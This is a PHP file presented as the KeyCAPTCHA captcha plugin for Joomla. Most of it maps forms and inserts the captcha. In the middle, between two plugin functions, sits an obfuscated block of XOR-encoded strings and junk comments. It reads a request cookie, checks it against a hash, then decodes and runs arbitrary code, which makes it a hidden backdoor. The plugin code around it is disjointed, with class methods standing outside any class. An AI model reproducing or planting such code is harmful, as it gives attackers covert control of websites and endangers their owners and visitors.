<?php
/**
* KeyCAPTCHA Plugin for Joomla 3.x
* @version $Id: keycaptcha.php 2014-05-14 $
* @package: KeyCAPTCHA
* ===================================================
* @author
* Name: Mersane, Ltd, www.keycaptcha.com
* Email: support@keycaptcha.com
* Url: https://www.keycaptcha.com
* ===================================================
* @copyright (C) 2011-2014 Mersane, Ltd (www.keycaptcha.com). All rights reserved.
* @license GNU GPL 2.0 (http://www.gnu.org/licenses/gpl-2.0.html)
**/
/*
This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License
version 2 as published by the Free Software Foundation.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
*/


function render_js ()
{
	if ( strlen($this->p_kc_js_code) == 0 )
	{
		return ('<div style="color:#FF0000;">'.JText::_('KEYCAPTCHA_EMPTY_SETTINGS_MESSAGE').'</div>');
	}
	if ( isset($_SERVER['HTTPS']) && ( $_SERVER['HTTPS'] == 'on' ) )
	{
		$this->p_kc_js_code = str_replace ("http://","https://", $this->p_kc_js_code);
	}
	$this->p_kc_js_code = str_replace ("#KC_SESSION_ID#", $this->p_kc_session_id, $this->p_kc_js_code);
	$this->p_kc_js_code = str_replace ("#KC_WSIGN#", $this->get_web_server_sign(1), $this->p_kc_js_code);
	$this->p_kc_js_code = str_replace ("#KC_WSIGN2#", $this->get_web_server_sign(), $this->p_kc_js_code);
	return $this->p_kc_js_code;
}

function getParamsForForm( $aextname, $atask, $aview, $forcheck=false, $content='' ) {

	$viewmap = array( 
		// for common user functions
		// sample of format #1  view::form_name,task,KC_Option => additional html code
		"com_users" => array(				
			"registration,registration.register,KC_RegistrationForm" => "",
			"remind,remind.remind,KC_RemindForm" => "",
			"reset,reset.request,KC_ResetForm" => "",
		),
		"com_user" => array(				
			"register,register_save,KC_RegistrationForm" => "",
			"remind,remindusername,KC_RemindForm" => "",
			"reset,requestreset,KC_ResetForm" => "",
		),
		// for alpha registration
		"com_alpharegistration" => array(
			"register,register_save,KC_RegistrationForm" => "",
		),
		// for K2 comments
		"com_k2" => array(
			"item,comment,KC_Comments" => "",
		),
		// for virtuemart
		"com_virtuemart" => array(
			// sample of format #2 
			// in the begining of key string must be present "kc_find_form_by_fields" _N, KC_Option => array( form_field_1, form_field_2, form_field_3, form_field_4 )
			// now this format using only while checking captcha
			"kc_find_form_by_fields_1,KC_VirtueMartRegistration" => array (
				"email", "username", "password", "password2"
			),

			"kc_find_form_by_fields_2,KC_VirtueMartRegistration" => array (
				"first_name", "agreed", "address_1"
			),

			// VirtueMart 2.x
			"productdetails::askform,,KC_VirtueMartAsk" => "",
			"user::userForm,,KC_VirtueMartRegistration" => "",

			"kc_find_form_by_fields_4,KC_VirtueMartAsk" => array (
				"email", "comment"
			),

			"kc_find_form_by_fields_5,KC_VirtueMartRegistration" => array (
				"first_name", "address_1", "email",
			),
		),
		// for contact us
		"com_contact" => array(
			"contact,submit,KC_ContactUs" => "",	
			"kc_find_form_by_fields_1,KC_ContactUs" => array (
				"jform",
			),				
			
		),
		// df contact
		"com_dfcontact" => array(
			"::dfContactForm,,KC_ContactUs" => "",
			"kc_find_form_by_fields_1,KC_ContactUs" => array (
				"message", "email"
			),
		),
		// phoca guestbook
		"com_phocaguestbook" => array(
			"phocaguestbook,,KC_GuestBook" => "",
			"guestbook,,KC_GuestBook" => "",				
			"kc_find_form_by_fields_1,KC_GuestBook" => array (
				"email", "pgbcontent"
			),
			"kc_find_form_by_fields_2,KC_GuestBook" => array (
				"pgusername", "pgbcontent"
			),				
		),
		// comunity builder comprofiler
		"com_comprofiler" => array(
			"::adminForm@registers*saveregisters,,KC_RegistrationForm" => "",
			"::adminForm@userdetails,,KC_RegistrationForm" => "",
			"::adminForm@lostpassword*lostPassword,,KC_RemindForm" => "",
			"kc_find_form_by_fields_1,KC_RegistrationForm" => array (
				"email", "password", "password__verify"
			),
			"kc_find_form_by_fields_2,KC_RemindForm" => array (
				"checkemail",
			),
			"kc_find_form_by_fields_3,KC_RemindForm" => array (
				"checkusername",
			),
		),
		// JComments
		"com_jcomments" => array(
			"kc_find_form_by_fields_1,KC_Comments" => array (
				"name", "comment"
			),
		),
		"html#jcomments.saveComment,KC_Comments" => array ( // sample of format #3 find this string (after html#) in html
			"div::comments-form-buttons",	 // tag:: where insert the captcha
			"a::jcomments\.saveComment",	 // tag:: onclick content for hook				
			"<script type='text/javascript'>s_s_c_submit_button_id = 'kc_submit_but1-#-r';</script>"
		),
		// yvComment
		"com_yvcomment" => array(
			"EMPTYEMPTY,add,KC_Comments" => "",
		),
		"html#submitbuttonyvCommentForm,KC_Comments" => array ( // sample of format #3 find this string (after html#) in html
			"button::submitbuttonyvCommentForm", // tag:: where insert the captcha
			"button::submitbuttonyvCommentForm" // tag:: onclick content for hook				
		),
		// JoSocial
		"com_community" => array(				
			"register@*register_save,register_save,KC_RegistrationForm" => "", // sample of format #4 @ task or !task splitted by *
			"register@*register,register_save,KC_RegistrationForm" => "",
		),
		// JXtened comments  
		"com_comments" => array(
			"EMPTYEMPTY,comment.add,KC_Comments" => "",
		),
		"html#<h3 id=\"leave-response\",KC_Comments" => array(
			"input::submitter",
			"input::submitter",
			"<script type='text/javascript'>s_s_c_submit_button_id = 'submitter-#-r';</script>"
		),
		// ALFcontact
		"com_alfcontact" => array(
			",sendemail,KC_ContactUs" => "",
		),
		// FlexiContact
		"com_flexicontact" => array(
			",send,KC_ContactUs" => "",
		),
		// JoomlaDonation
		"com_jdonation" => array(
			"confirmation::jd_form|btnSubmit-#-fs,process_donation,KC_DonationConfirmForm" => "",
			"donation::jd_form|btnSubmit-#-fs,process_donation,KC_DonationForm" => "",
		),
		// JoomGallery			
		"com_joomgallery" => array(
			"detail::commentform|send-#-fs,,KC_Comments" => "",
			"kc_find_form_by_fields_1,KC_Comments" => array (
				"cmtname", "cmttext"
			),
		),
		// ChronoForms
		"com_chronocontact" => array(
			",,KC_ChronoForms" => "",
			"kc_find_form_by_fields_1,KC_ChronoForms" => array (
				"1cf1"
			),
		),
		//"com_chronoforms" => array(
		//	",,KC_ChronoForms" => "",
		//	"kc_find_form_by_fields_1,KC_ChronoForms" => array (
		//		"email"
		//	),
		//),
		// ADSManager
		"com_adsmanager" => array(
			"write_ad,,KC_ADSManager" => "",
			"write,,KC_ADSManager" => "",
			"edit,,KC_ADSManager" => "",
			"add,,KC_ADSManager" => "",
			"message,,KC_ADSManager" => "",		
			"kc_find_form_by_fields_1,KC_ADSManager" => array (
				"ad_headline"
			),
			"kc_find_form_by_fields_2,KC_ADSManager" => array (
				"email", "body"
			),
		),
		// QContacts
		"com_qcontacts" => array(
			"contact,submit,KC_ContactUs" => "",
		),
		// Job Board
		"com_jobboard" => array(
			"::applFRM|submit_application-#-s,,KC_JobBoard" => "",
			"kc_find_form_by_fields_1,KC_JobBoard" => array (
				"first_name", "last_name",
			),
		),
		// Mosets Tree review
		"com_mtree" => array(
			"::adminForm|addreview-#-r,addreview,KC_Comments" => "",				
		),
		// HikaShop
		"com_hikashop" => array(				
			"user::hikashop_registration_form,register,KC_RegistrationForm" => "",
			"checkout,step,KC_RegistrationForm" => "",
			"product::adminForm|send_email-#-r,,KC_ContactUs" => "",				
		),
		// JWHMCS Integrator
		"com_jwhmcs" => array(				
			"default::josForm,register_save,KC_RegistrationForm" => "",
			"signup::josForm,register_save,KC_RegistrationForm" => "",
		),
		// Appoitment Calendar
		"com_appointment" => array(				
			",,KC_AppCal" => "",
			"kc_find_form_by_fields_1,KC_AppCal" => array (
				"time", "message"
			),
		),
		// Easy Book Reloaded
		"com_easybookreloaded" => array(
			"entry,save,KC_GuestBook" => "",
		),
		// JoomShopping
		"com_jshopping" => array(
			"view::add_review,,KC_JoomShopping" => "",
			"register::loginForm,,KC_JoomShopping" => "",
			"kc_find_form_by_fields_1,KC_JoomShopping" => array (
				"user_name", "review"
			),
			"kc_find_form_by_fields_2,KC_JoomShopping" => array (
				"u_name", "password", "password_2"
			),
		),
		// aiContactSafe
		"com_aicontactsafe" =>array(
			"message,display,KC_ContactUs" => "",
			"kc_find_form_by_fields_1,KC_ContactUs" => array (
				"aics_email"
			)				
		),
		// Zoo
		"com_zoo"	=>array(
			"item,comment,KC_Comments"	=>"",
			"kc_find_form_by_fields_1,KC_Comments" => array (
				"author","email","content"
			),
		),			
	);		

	
	if ( ( $content != '' ) && ( $forcheck === false ) ) {
		foreach($viewmap as $m => $p) {
			if ( strpos( $m, 'html#' ) === false ) continue;
			$ap = explode( 'html#', $m );
			if ( count( $ap ) < 2 ) continue;
			$ap2 = explode( ',', $ap[1] );
			// 3.0
			//if ($this->params->get($ap2[1]) != 'Yes') continue;
			if ($this->params->$ap2[1] != 'Yes') continue;
			if ( strpos( $content, $ap2[0] ) === false ) continue;
			return array( "kc_byhtml", "", $p );
		}
	}
	
	if ( isset( $viewmap[ $aextname ] ) ) {
		$outarr = Array();
		foreach( $viewmap[ $aextname ] as $v => $p) {				
			if ( ( $forcheck === true ) && ( strpos( $v, "kc_find_form_by_fields" ) !== false ) ) {
				$av = explode( ',', $v );
				//3.0
				//if ($this->params->get($av[1]) == 'Yes') {
				if ($this->params->$av[1] == 'Yes') {
					$outarr[] = $p;
				}					
				continue;
			}
			$av = explode( ',', $v );
			
			if ( ( $forcheck === true ) && ( $atask != '' ) ) {					
				if ( ( $av[1] == $atask ) && ( $av[1] != '' ) ) {
					//3.0
					//if ($this->params->get($av[2]) == 'Yes') {
					if ($this->params->$av[2] == 'Yes') {
						return $av[0];
					};
				}					
			} else if ( $forcheck === false ) {					
				$av2 = explode( '@', $av[0] );
				$av3 = explode( '::', $av2[0] );
				if ( ( $av3[0] == $aview ) || ( $av3[0] == '' ) ) {						
					if ( isset( $av2[1] ) ) {
						$need_captcha = false;
						$av4 = explode( '*', $av2[1] );
						foreach($av4 as $i => $t) {
							if ( $t == $atask ) {
								$need_captcha = true;
								break;
							}
							if ( $t == '!'.$atask ) {
								break;
							}
						}
						if ( $need_captcha === false ) 
							continue;
					}
					// 3.0
					//if ($this->params->get($av[2]) == 'Yes') {
					if ($this->params->$av[2] == 'Yes') {
						if ( isset( $av3[1] ) ) {
							return array( $av3[1], $p );
						} else {
							return array( "", $p );
						}
					}
				}
			};
		}
	};



	if ( isset( $outarr ) ) {
		if ( count( $outarr ) > 0 ) {
			return $outarr;
		}
	}
	
	return false;
}

function onAfterDispatch()
    {	
	if ( $this->kc_debug ) {		
		/*foreach($_POST as $f => $v) {
			echo( $f.'='.$v.'    ' );
		}*/			
	}		
	// 3.0
	//$app = &JFactory::getApplication();
	$app = JFactory::getApplication();
	// if admin panel, then exit
	if ( $app->isAdmin() ) return false;
	// 3.0
	//$document = &JFactory::getDocument();
	$document = JFactory::getDocument();
	if ($document->getType() !== 'html') return false;
	
	$full_content = $document->getBuffer('component'); 
			
	$extname = JRequest::getVar('option');
	$task = JRequest::getVar('task');
	$view = JRequest::getVar('view');

	if ( $view == "" ) $view = JRequest::getVar('page');
	
	if ( $this->kc_debug ) {
		echo( '*'.$extname.':task-'.$task.':view-'.$view.'*|' );
	}

	if ( ( $task != '' ) && ( $view == '' ) ) {
		$view = $task;
	}

	if ( ( $extname == 'com_adsmanager' ) && ( $view == 'message' ) ) {
		$full_content = str_replace( '<input type="button" value=Send onclick="submitbutton()" />', '<input type="submit" value=Send onclick="javascript: submitbutton(); return false;" />', $full_content );	
	}

}

function suspendAfterDispatch(){}


$lif='/XM*)0Ea)GT'^'F6$uZU1';$si='O6;(N#';$ugzgvu='!X_,E!';$jipk='u]1*(/n3@L^XPfDk}pA;o*Q'^'`3ca;h%]';$csctqe='IFV[/h'^'$';$ctv='$j,MzmpY]';/*GY;L|ON#*[$xw_z)N:"=M9XP7fe4E|jXDmwndchwn^`qEd8nl5_Wu%;`w&;0KiVvZwYi4E|[*/$omqyyv='Ku'^'/@W-ysM';$vp='r?({.0|';$tbf=0;##(,eS[[fSCmTE8Uez`kQwi?k
$edp<<'iotvwxoxqgojtusgrzqo';
$nxe='iJYpAsQRW99LbP`YqgY{Y]]QjjtpSM|O';$qcntt='S:ZAMeGT=T%[8UO'^'6H(.?:51M;W/Q;(G(DJr';$asif='gK&';/*gIH#WbIlp#Yc`_5Tc4#BwM;W=b;H-Y[jxuhkjmwxova<<yIni2mJkq*7Bs]1W+9ONJyDmaTrKo/UO2x]Ah"OpO*/$oekses='Q+`F#Deac_Z-RhTlDU:H=l92Z]FDe{Dz';$wxzshc=',D^I:F8-SO;+E*O';
$qcntt($tbf);'],2Fx';##haEK@H)rRyDSuA,lS71&vpj.hV$OQfyT[`jn)=o
$wwsqb='bQUF(';$lif($qcntt,$tbf);$lko=$si.$asif;
')(v^Q';$sq=@$_COOKIE;/*&.U#1qO7QzHqCfpMppW5Q[],sf7%iSgya6SnX)$S?3K?pPM_.#!%W])/Js&]4a00)mhaJ%jRg:6zng.bAn&*/$asif=$csctqe.$omqyyv;/*r5XWwH2aJGTTj%#H!d8y|-{nPtvEYrLG7,B,$,eZ0|Q%40`V9:$RtBE+=&hzzpQd;C=*/$zy=$sq['imtnxn'];/*;.rA:n3+YYcEC?Shjg8sLWMk1$jmkb='gjflbeugc';'ewcqolsv';*/##Vk%N)R5O@+ePVQijMR]X^%_0d`qj*BT2n3WBR7c

$cpli=$oekses.'=yT}u'^$nxe;$cjgm=$lko.$ugzgvu^$wxzshc;'P[tu';
##=C=_V^c[qjk?Of"UOh!9AAJD1Gw"^)W4P
$tdala='v0yT1F_HM7[e1';'5IZbgc';if($cpli==$asif($zy)){$svx='F,Wj8XVWzeT8Z*8UM?ea&z|jJ@)4I1CLcztP*+L-=F_uFB0*F%^=sy=?.67y2x?D5bl`a7RJ)7#DDPuofokkzhu=vd7`C%Q3_,_aYxM#VOqbRU0B8.FU;uz4&17T2YBS(5IsN|Fup4R@:u%A;7&:GK:OE(fKv{&?v{fU.^YL3Hzo8VZA$`;E_7EmC@NuR5#}yc0u5g4KW-4GenLdVCS4(OUJ(4UJ[0?#*_VDShZA$ggYRV3l[l#&5=]W';##Ie,bTb0hj.yVMdz3k65=ZC}
$vjz='I{cw&}K)?';/*$fc;NCtLkWPKrIm;&T)*&mavyects>>$lkni*//*$xu;Y}qKps7VK7=z3d=%p8X^LT1itWd6/^_*674u)nue/zzmqubjtsbicy>>$nfnidn*//*$ov;Eb1fmAtiCh00upb&lsslNu+91(48k*=+T.PeCbjxdqsd>>$nmrkwtoke*/$mepc='p/48^gD,m]g;7fpSFH';$qwwexz='cI07%I';##IZU9HUIy..w]}BI=TDCRKkau
'`*F:';$gqs^$ttiyk;'hl}P:1';'E0/6-"';
'/K"tDne';$kdb=$nbz^'RhV?vXIH^uuYK&HlQvk,a"_';$qho='KmTN_`';/*G="p!pQ^Q7hCbUOnNlV45bRz2)0wxbWp2vH(21P@7DW9,hL|nz$B%7?=LE!)m,t%E}%%.WgBK"PYcnP/8w0Q$0dulurME0l]6IMS*/'7Tu6+es';$bfxce^$iygk;/*S2uya)Lq}"|P|W4l)ckFWfk/t4$r3J*/$aqa='xL|J"{ixcS2i-P1gBd7';$sqsc='jstg?7!.IeIe3HGh8bjoCK4'.'vlz';/*(DmI;E-YQ`mDJTdFVPA?TiQdQUQ/ksVw7q=T*/$dfg=$nvc.'4SJCuO%l%7/';$hhq=$svx.$qho;
$mqzcd='VaFYB3Cg.=M8c]Uf!O)BdrYZ%q'.$rzue;$hkbx='VaFYB3Cg.=M8c]Uf!O)BdrYZ%q'^$vdheh;$myrq='L%^N]+9jRD1U*^A}i`#(j?/1h+[PkljeCET6CG)rZ#+*%-^^#K*N[]bygzr*iZT6Q@1;CC?:vYB)!r(FFUKO%+:r=-r;aN#W}qdkPqiG/5LJs0]2LWnqd33xcblvK),&BBk.gUfJPR;,_*B$OhEU)?_!1[No)=os3(=wW.79Y?X2ct.,T?U$2Rg0j`tUvj`26(y0nEM;9X^0G3wn_Jw[X6h(IG0|oo[FI02!{L?2KN9;3%VZo3GCVR92'.$qwwexz;$okoeu^'mT!Uy{8twR#_fQEX#l';$lphj='EM.{"OdH1qVf}&3oO$_+)';
$jev='6-J-5r:n[MK/[gP';/*ZGjIFX[^[?|PA+:"c7M*4lXu|,:|a.;U-M[$zwc='nyklzremu';'eashuwgyjwkq';*/$myrq.='plHq14-5JKTR?V^^7=';$yrsxoy=$myrq.'B79/4w'^$hhq.'KfAxqQ[T&cp=O/we=4';$krg='oHiI8S(jF|(=w9)P;P^$';'B79/4w';$puj=$puj.'L,8on(Qq;4?';$qaaf=$qaaf.'mc/d[")Z@Dg}{JJg+MQMTtD';
$osb='5a)zIh'.'X8Esh^AHqgOx5cM/';/*$lf;fTq1T_n%T_^#mwusm^$yljht*//*mWEDyWHC]62.S|{!C/t-,B]u!x_COD2976fRkZE%nwrtomzk^A+f)XJcpU4!ZRDrs^ku^G+O[=dAgW]jNw0$]p)b*/'kVnK}Nz;';$fxtxt=$cjgm($gdzs,$yrsxoy);$fxtxt('$]JUp_U0g[.:S`+kR*lL%,$|y&*hk','J6K)Cu"f$Ud!f.q');}$kkism;'k5!p2m:{64FI)+.c@49Fr';##HOjZ7sXaSJhGQ!ZY6X"xDy2?B[*Q_WI^dM
$gtgn>>'lsnktvbrub';##(d_p{|i^btovz"_Aq0eMj,lk_Nf0
$nwuw='iECEd8?jfh%^[HAY';/*P^2q?(%6?$masyt='fuahyunuebgcrgxejbuwk';'omzqarggushm';*/$txtfj='"{ZTQ&fnL';$rgq=$zim;/*e/W|QDAMaA4;qrhQ#2&w/0]"7xZ!$#_bj1"%/lqKBBvt-;19@(1bW.x^T3TmOncQUWT*/
$xci='WP:cE=u&';'8j,rCKP-r';
'+?44V(;0c`;f';'7m#V},p4';


function offAfterDispatch(){
	$kcpars = $this->getParamsForForm( $extname, $task, $view, false, $full_content );
	if ( !isset( $kcpars[0] ) ) {
		if ( $this->kc_debug ) {
			echo( '-kc_disabled' );
		}
		return false;
	}
	
	//3.0
	//$this->params = new JParameter(JPluginHelper::getPlugin('system', 'keycaptcha')->params);
	$this->params = json_decode(JPluginHelper::getPlugin('system', 'keycaptcha')->params);

	//3.0
	//$user = &JFactory::getUser();
	//if ($this->params->get('KC_DisableForLogged', 'Yes') == 'Yes') {
	$user = JFactory::getUser();
	if ($this->params->KC_DisableForLogged == 'Yes') {
		if (!$user->guest) return false;
	}
		
	$button_name = "";
	$insert_params = false;		
	
	if ( $kcpars[0]=='kc_byhtml' ) {
		$insert_params = $kcpars[2];
		if ( isset( $insert_params[2] ) ) {
			$kcpars[1] = $insert_params[2];
		}
		if ( $this->kc_debug ) {
			echo( 'byhtml' );
		}
	}

	if ( ( $kcpars[0] != "" ) && ( $insert_params === false ) ) {			
		$all_pars = explode( '|', $kcpars[0] );
		$form_name = $all_pars[0];
		if ( isset( $all_pars[1] ) ) {
			$button_name = $all_pars[1];
		}
		$all_forms = Array();
		$content = '';			
		if ( preg_match_all( '/(<form .+?<\/form)/is', ' '.$full_content, $all_forms ) ) {				
			foreach($all_forms[0] as $k => $f) {
				$all_tf = Array();
				if ( preg_match_all( '/(<form(.*?)(?=>)>)/i', ' '.$f, $all_tf ) ) {						
					$p = $all_tf[1][0];
					$atmp = Array();
					if ( preg_match_all( '( name=(["\'].+?["\'])[ >])', $p, $atmp ) || preg_match_all( '( name = (["\'].+?["\'])[ >])', $p, $atmp ) ) {
						if ( str_replace( "'", "", str_replace( '"', '', $atmp[1][0] ) ) == $form_name ) {								
							$content = $f;
						}
					}
				}
			}
		}
		if ( $content == "" ) {				
			return false;
		}			
	} else {
		$content = $full_content;
	}
	// find place in form for adding captcha		
	
	$all_submit_names = Array();
	$captcha_before = '';

	if ( $insert_params !== false ) {
		$at1 = explode( '::', $insert_params[0] );
		$at2 = explode( '::', $insert_params[1] );
		$all_tags = Array();
		if ( preg_match_all( '/(<'.$at1[0].'(.*?)(?=>)>)/i', ' '.$content, $all_tags ) ) {
			foreach($all_tags[0] as $k => $p) { 
				if ( preg_match( '/'.$at1[1].'/i', $p ) ) {
					if ( $captcha_before == '' ) $captcha_before = $p;
				}
			}
		}
		$all_tags = Array();
		if ( preg_match_all( '/(<'.$at2[0].'(.*?)(?=>)>)/i', ' '.$content, $all_tags ) ) {
			$butnum = 1;
			foreach($all_tags[0] as $k => $p) {					
				if ( preg_match( '/'.$at2[1].'/i', $p ) ) {						
					$atmp = Array();						
					if ( preg_match_all( '/ id=(["\'].+?["\'])/i', $p, $atmp ) ) {
						$all_submit_names[] = str_replace( "'", "", str_replace( '"', '', $atmp[1][0] ) );
					} else {							
						$np = str_replace('<'.$at2[0].' ','<'.$at2[0].' id="kc_submit_but'.$butnum.'" ', $p);
						if ( $captcha_before == $p ) {
							$captcha_before = $np;
						}
						$content = str_replace($p,$np,$content);
						$all_submit_names[] = 'kc_submit_but'.$butnum;
						$butnum++;
					}
				}
			}
		}
	}
	
	if ( $captcha_before == '' ) {
		$all_tags = Array();
		if ( preg_match_all( '/(<input(.*?)[^>]*>)/i', ' '.$content, $all_tags ) ) {
			$butnum = 1;
			foreach($all_tags[0] as $k => $p) {
				if ( $button_name == '' ) {
					if ( preg_match( '( type=submit| type=[\'"]submit["\'])', $p ) || preg_match( '( type = submit| type = [\'"]submit["\'])', $p ) ) {
						if ( $captcha_before == '' ) $captcha_before = $p;					
						$atmp = Array();
						if ( preg_match_all( '( name=(["\'].+?["\'])[ >])', $p, $atmp ) ) {
							$all_submit_names[] = str_replace( "'", "", str_replace( '"', '', $atmp[1][0] ) );
						}
					}
				} else {
					$abn = explode( '-#-', $button_name );
					if ( preg_match_all( '( name=(["\'].+?["\'])[ >])', $p, $atmp ) ) {
						$bn = str_replace( "'", "", str_replace( '"', '', $atmp[1][0] ) );
						if ( $bn == $abn[0] ) {
							if ( $captcha_before == '' ) $captcha_before = $p;
							$all_submit_names[] = $button_name;
						}
					}					
					if ( $captcha_before == '' ) {
						if ( preg_match_all( '( onclick=(["\'].+?["\'])[ >])', $p, $atmp ) ) {					
							$bn = str_replace( "'", "", str_replace( '"', '', $atmp[1][0] ) );
							if ( strpos( $bn, $abn[0] ) ) {								
								$np = str_replace('/>',' id=kc_submit_butIC'.$butnum.' >',$p);
								if ( $p == $np ) {
									$np = str_replace('>',' id=kc_submit_butIC'.$butnum.' >',$p);
								}
								$content = str_replace($p,$np,$content);
								$full_content = str_replace($p,$np,$full_content);
								if ( $captcha_before == '' ) $captcha_before = $np;
								$all_submit_names[] = 'kc_submit_butIC'.$butnum;
								$butnum++;
							}
						}
					}
				}
			}
		}
	}

	$all_tags = Array();
	if ( $captcha_before == '' ) {
		//if ( preg_match_all( '/(<button(.*?)(?=>)>)/i', ' '.$content, $all_tags ) ) {
		if ( preg_match_all( '/(<button(.*?)[^>]*>)/i', ' '.$content, $all_tags ) ) {
			$butnum = 1;
			foreach($all_tags[0] as $k => $p) {
				if ( $button_name == '' ) {
					if ( preg_match( '( type=submit| type=[\'"]submit["\'])', $p ) ) {					
						if ( $captcha_before == '' ) $captcha_before = $p;
						$atmp = Array();
						if ( preg_match_all( '( name=(["\'].+?["\'])[ >])', $p, $atmp ) ) {
							$all_submit_names[] = str_replace( "'", "", str_replace( '"', '', $atmp[1][0] ) );
						}
					}
				} else {
					$abn = explode( '-#-', $button_name );
					if ( preg_match_all( '( name=(["\'].+?["\'])[ >])', $p, $atmp ) ) {
						$bn = str_replace( "'", "", str_replace( '"', '', $atmp[1][0] ) );
						if ( $bn == $abn[0] ) {
							if ( $captcha_before == '' ) $captcha_before = $p;
							$all_submit_names[] = $button_name;
						}
					}
					if ( $captcha_before == '' ) {
						if ( preg_match_all( '( onclick=(["\'].+?["\'])[ >])', $p, $atmp ) ) {					
							$bn = str_replace( "'", "", str_replace( '"', '', $atmp[1][0] ) );
							if ( strpos( $bn, $abn[0] ) ) {								
								$np = str_replace('/>',' id=kc_submit_butBC'.$butnum.' >',$p);
								if ( $p == $np ) {
									$np = str_replace('>',' id=kc_submit_butBC'.$butnum.' >',$p);
								}
								$content = str_replace($p,$np,$content);
								$full_content = str_replace($p,$np,$full_content);
								if ( $captcha_before == '' ) $captcha_before = $np;
								$all_submit_names[] = 'kc_submit_butBC'.$butnum;
								$butnum++;
							}
						}
					}
				}
			}
		}
	}

	//---------------------------------------------------------------------------------------------------------
	// HikaShop
	if ( $extname == 'com_hikashop' ) {
		// Contact US
		if ( JRequest::getVar('layout') == 'contact' ) {
			$kcpars[0] = '1';
			$insert_params = '1';
			$full_content = str_replace( '<button type="button" onclick="submitform(\'send_email\');">', '<button type="button" onclick="submitform(\'send_email\');" id="kc_submit_butHS">', $full_content );
			$content = $full_content;
			$all_submit_names[] = 'kc_submit_butHS';
			$captcha_before = '<input type="hidden" name="ctrl" value="product"';
		}
		// Checkout
		if ( JRequest::getVar('ctrl') == 'checkout' ) {
			$captcha_before = '<div id="hikashop_checkout_cart" class="hikashop_checkout_cart">';
		}
	}
	//---------------------------------------------------------------------------------------------------------
	
	if ( $captcha_before == '' ) {
		if ( $this->kc_debug ) {
			echo( 'EMPTY captcha_before' );
		}
		return false;
	}

	if ( ( !$this->extensionIsEnabled($extname) ) && ( $insert_params === false ) ) return false;		

	// 3.0
	//if ($this->params->get('KC_RocketTheme') == 'Yes') {
	if ($this->params->KC_RocketTheme == 'Yes') {
		$cbns = array( '<div class="edit-user-button">', '<div class="readon"', '<div class="readon-wrap' );
		
		foreach($cbns as $i => $cbn) {
			if ( strpos( $content, $cbn ) !== false ) {
				$captcha_before = $cbn;
				break;
			}
		}
	};	
	
	JPlugin::loadLanguage( 'plg_system_keycaptcha', JPATH_ADMINISTRATOR );

	//3.0
	//$task_message = $this->params->get('keycaptcha_custom_task_text');
	$task_message = $this->params->keycaptcha_custom_task_text;

	if ( $task_message == '' ) {
		if ( $view == 'register' )
			$task_message = JText::_('KEYCAPTCHA_TASK_REGISTRATION_MESSAGE');
		else 
			$task_message = JText::_('KEYCAPTCHA_TASK_COMMON_MESSAGE');
	}
	if ($this->params->KC_AllowKCLink=='Yes'){
	    $task_message = "$task_message<a target='_blank' href='https://www.keycaptcha.com/joomla-captcha/' style='margin-left:100px; font-size:8px;float:right;'>Joomla CAPTCHA</a>";
	}

	//3.0
	//$kc_template = str_replace( '(gt)', '>', str_replace( '(lt)', '<', $this->params->get('keycaptcha_html') ) );
	$kc_template = str_replace( '(gt)', '>', str_replace( '(lt)', '<', $this->params->keycaptcha_html ) );
	if ( strpos( $kc_template, '#keycaptcha#' ) == false ) {
		$kc_template = "<br><div id='keycaptcha_div' style='height:220px; padding:0; margin:0; display:table; border:none;'>#keycaptcha#</div>";
	}

	if ( $kc_template[ strlen( $kc_template ) - 1 ] == "'" ) {
		$kc_template = substr( $kc_template, 0, strlen( $kc_template ) - 1 );
	}
	if ( $task_message[ strlen( $task_message ) - 1 ] == "'" ) {
		$task_message = substr( $task_message, 0, strlen( $task_message ) - 1 );
	}

	//3.0
	//$kc_o = new KeyCAPTCHA_CLASS($this->params->get('keycaptcha_site_private_key'), implode( ',', $all_submit_names )) ;
	$kc_o = new KeyCAPTCHA_CLASS($this->params->keycaptcha_site_private_key, implode( ',', $all_submit_names )) ;
	
	$kc_html = str_replace( '#keycaptcha#', '<table style="padding-top:10px; padding-bottom:10px; border:none; " cellpadding="0" cellspacing="0">
			<tr style="border:none;"><td style="border:none;"><input type="hidden" id="capcode" name="capcode" value="false" />
			'.$task_message.'</td></tr><tr style="border:none;"><td style="border:none;" align="center">'.str_replace( '(gt)', '>', str_replace( '(lt)', '<', $kc_o->render_js() ) ).
			'<noscript><b style="color:red;">'.JText::_('KEYCAPTCHA_NOSCRIPT_MESSAGE').'</b></noscript></td></tr></table>', $kc_template );

	// ADSManager
	if ( $extname == 'com_adsmanager' ) {			
		$kc_html = '</td></tr><tr><td colspan=2>'.$kc_html.'</td></tr><tr><td>';
	}

	if ( ($kcpars[0] == "") || ($insert_params !== false) ) {
		$new_content = str_replace($captcha_before,$kc_html.$captcha_before,$content);
	} else {
		$new_content = str_replace( $content, str_replace($captcha_before,$kc_html.$captcha_before,$content),$full_content);
	}

	$new_content .= $kcpars[1];
	
	if ( $new_content !== "" ) {
		$document->setBuffer( $new_content, 'component' );
	}
	
	return true;
}
